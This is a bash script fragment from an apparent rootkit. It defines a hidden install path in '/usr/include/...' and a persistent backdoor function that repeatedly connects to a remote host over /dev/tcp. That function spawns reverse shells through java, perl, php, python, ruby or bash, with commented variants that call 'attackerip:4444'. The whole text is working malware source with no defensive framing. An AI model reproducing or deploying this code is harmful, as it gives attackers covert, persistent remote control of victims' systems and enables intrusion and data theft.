#!/bin/bash
declare ROOTKIT_PATH
function set_rootkit_path() {
    if [ $UID -eq 0 ] || [ $EUID -eq 0 ]
        then ROOTKIT_PATH="/usr/include/..."
        else ROOTKIT_PATH="/home/$USER/..."
    fi
}

function br_connect_backdoor() {
    local target_ip=$remote_host ; local target_port=$remote_port ; local sleep_time=$sleep_time
    while true; do
        MAX_ROW_NUM=$(stty size|cut -d " " -f 1) ; MAX_COL_NUM=$(stty size|cut -d " " -f 2); 
        { PS1='[\A j\j \u@\h:t\l \w]\$'; export PS1
        exec 9<>/dev/tcp/"$target_ip"/"$target_port" ; [ $? -ne 0 ] && exit 0 || exec 0<&9; exec 1>&9 2>&1
        if [ ! -x "$(type java>/dev/null)" ]
            then export MAX_ROW_NUM MAX_COL_NUM; java -cp 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();'
        elif [ ! -x "$(type perl>/dev/null)" ]
            then export MAX_ROW_NUM MAX_COL_NUM; perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
            # perl that does not depend on /bin/sh:
            # perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
        elif [ ! -x "$(type php>/dev/null)" ]
            then export MAX_ROW_NUM MAX_COL_NUM; php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
        elif [ ! -x "$(type python>/dev/null)" ]
            then export MAX_ROW_NUM MAX_COL_NUM; python -c 'import pty; pty.spawn("/bin/bash")';
        elif [ ! -x "$(type ruby>/dev/null)" ]
            then export MAX_ROW_NUM MAX_COL_NUM; ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
            # ruby that does not depend on /bin/sh:
            # ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
        else /bin/bash --rcfile "$ROOTKIT_PATH"/.bdrc --noprofile -i
        fi; }& wait; sleep $((RANDOM%sleep_time+sleep_time)); done
}
